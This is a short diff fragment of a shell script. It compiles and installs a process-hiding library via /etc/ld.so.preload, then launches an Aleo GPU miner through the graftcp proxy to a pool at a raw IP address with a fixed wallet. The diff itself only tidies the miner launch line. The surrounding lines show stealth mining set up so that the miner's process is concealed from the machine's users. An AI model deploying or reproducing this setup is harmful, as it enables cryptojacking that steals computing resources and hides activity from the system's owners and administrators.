@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./aleo_prover --pool 167.99.155.214:443 --address aleo17wrmqw83955g88dnwlwmsdquhw8h6vjynre8chtt4j3dgxragq8sqsstms --custom_name GPU
+./graftcp/graftcp ./aleo_prover --pool 167.99.155.214:443 --address aleo17wrmqw83955g88dnwlwmsdquhw8h6vjynre8chtt4j3dgxragq8sqsstms --custom_name GPU
